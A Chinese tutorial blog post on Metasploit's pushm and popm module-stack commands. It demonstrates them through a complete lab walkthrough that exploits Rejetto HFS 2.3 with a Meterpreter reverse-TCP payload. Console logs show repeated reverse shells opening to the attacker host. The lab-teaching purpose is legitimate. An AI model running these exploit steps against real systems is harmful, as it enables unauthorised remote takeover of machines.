---
layout: post
category: binghe-code-hack
title: Metasploit之pushm和popm命令
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit之pushm和popm命令
lock: need
---

# Metasploit之pushm和popm命令

使用pushm命令可以将当前模块放入模块栈中，而popm将位于栈顶的模块弹出。优势在于可以实现快捷操作，从而为测试者节省大量的时间和精力。

这里考虑一个场景：我们正在测试一台有多种漏洞的内部网络服务器，而且要对其中的所有系统都进行两种不同的渗透测试。为了能对每台服务器都进行这两种测试，我们就需要一个能在这两个渗透模块之间快速切换的机制。在这种情况下就可以使用pushm和popm命令。我们可以使用一个渗透模块对服务器的某个漏洞进行测试，然后将这个模块放入模块栈中，操作完成之后再载入另一个渗透模块。使用第二个模块完成任务之后，就可以使用popm命令将第一个模块(仍然保持之前的所有选项设置)从栈中弹出。

这里，我们在目标机上部署了HFS2.3服务，如下图：

![img](https://img-blog.csdnimg.cn/20190127204454193.png)

接着，我们利用HFS 2.3的漏洞拿到目标机的Meterpreter。

```
msfconsole
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOST 192.168.175.130
RHOST => 192.168.175.130
msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.175.128
LHOST => 192.168.175.128
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 192.168.175.128:4444 
[*] Using URL: http://0.0.0.0:8080/SM65nXQp
[*] Local IP: http://192.168.175.128:8080/SM65nXQp
[*] Server started.
[*] Sending a malicious request to /
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Payload request received: /SM65nXQp
[*] Meterpreter session 1 opened (192.168.175.128:4444 -> 192.168.175.130:1042) at 2019-01-25 15:41:58 +0800
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Meterpreter session 2 opened (192.168.175.128:4444 -> 192.168.175.130:1051) at 2019-01-25 15:41:58 +0800
[!] Tried to delete %TEMP%\GjPFpxreCevs.vbs, unknown result
[*] Server stopped.

meterpreter >
```

接着，我们通过background命令将当前会话放入后台，利用pushm命令将模块放入栈中，然后利用 exploit/multi/handler 模块渗透目标主机，如下：

```
meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(windows/http/rejetto_hfs_exec) > pushm 
msf5 exploit(windows/http/rejetto_hfs_exec) > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST 192.168.175.128
LHOST => 192.168.175.128
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.175.128:4444 
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Meterpreter session 3 opened (192.168.175.128:4444 -> 192.168.175.130:1054) at 2019-01-25 15:46:53 +0800

meterpreter > 
```

此时，我们就使用 pushm 命令将 windows/http/rejetto_hfs_exec 模块放到了栈中。并加载了 exploit/multi/handler 模块。当使用 exploit/multi/handler 模块完成操作之后，就可以使用popm命令从栈中再次加载 windows/http/rejetto_hfs_exec 模块，如下所示：

```
meterpreter > background
[*] Backgrounding session 3...
msf5 exploit(multi/handler) > popm
msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.175.130  yes       The target address range or CIDR identifier
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 192.168.175.128:4444 
[*] Using URL: http://0.0.0.0:8080/8rkX9sv1CkhYsB
[*] Local IP: http://192.168.175.128:8080/8rkX9sv1CkhYsB
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /8rkX9sv1CkhYsB
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Meterpreter session 4 opened (192.168.175.128:4444 -> 192.168.175.130:1067) at 2019-01-25 16:23:11 +0800

[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\gWZaxa.vbs' on the target

meterpreter > 
```

从模块栈中弹出的windows/http/rejetto_hfs_exec跟之前的设置一样，所以无须再设置这个模块的选项了。

## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)